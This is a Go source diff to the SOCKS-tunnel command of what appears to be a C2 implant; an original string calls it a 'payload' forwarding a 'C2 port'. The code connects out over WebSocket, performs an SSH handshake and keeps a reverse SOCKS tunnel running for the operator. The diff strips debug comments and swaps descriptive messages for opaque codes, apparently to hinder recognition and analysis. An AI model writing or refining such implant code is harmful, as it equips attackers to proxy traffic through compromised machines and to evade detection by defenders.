@@ -60,10 +60,9 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	ctx.mu.RUnlock()
 
 	if rawData == "" {
-		// removed debug log
 		return CommandResult{
-			Error:       fmt.Errorf("no SOCKS configuration data"),
-			ErrorString: "No SOCKS configuration data provided",
+			Error:       fmt.Errorf(E32),
+			ErrorString: Err(E32),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -85,10 +84,9 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if err := json.Unmarshal([]byte(rawData), &socksData); err != nil {
-		// removed debug log
 		return CommandResult{
 			Error:       err,
-			ErrorString: fmt.Sprintf("failed to parse socks config: %v", err),
+			ErrorString: Err(E33),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -128,7 +126,7 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			}
 			return CommandResult{
 				Error:       err,
-				ErrorString: fmt.Sprintf("failed to establish WebSocket connection: %v", err),
+				ErrorString: Err(E34),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -169,11 +167,10 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		wrapped := &wsConnWrapper{conn: wsConn}
 		sshConn, chans, reqs, err := ssh.NewClientConn(wrapped, "", sshConfig)
 		if err != nil {
-			// removed debug log
 			wsConn.Close()
 			return CommandResult{
 				Error:       err,
-				ErrorString: fmt.Sprintf("failed SSH handshake: %v", err),
+				ErrorString: Err(E35),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -203,10 +200,8 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		// Keep SSH connection alive (don't create a client that consumes channels)
 		go c.keepAlive(sshConn)
 
-		// removed debug log
-
 		return CommandResult{
-			Output:      fmt.Sprintf("SOCKS tunnel established - C2 port %d is forwarding through this payload", socksData.SocksPort),
+			Output:      fmt.Sprintf("S8|%d", socksData.SocksPort),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -227,17 +222,16 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		c.running = false
 		c.mu.Unlock()
 
-		// removed debug log
 		return CommandResult{
-			Output:      "SOCKS tunnel stopped",
+			Output:      Succ(S9),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 
 	default:
 		return CommandResult{
-			Error:       fmt.Errorf("unknown socks action: %s", socksData.Action),
-			ErrorString: fmt.Sprintf("unknown socks action: %s", socksData.Action),
+			Error:       fmt.Errorf(ErrCtx(E36, socksData.Action)),
+			ErrorString: ErrCtx(E36, socksData.Action),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
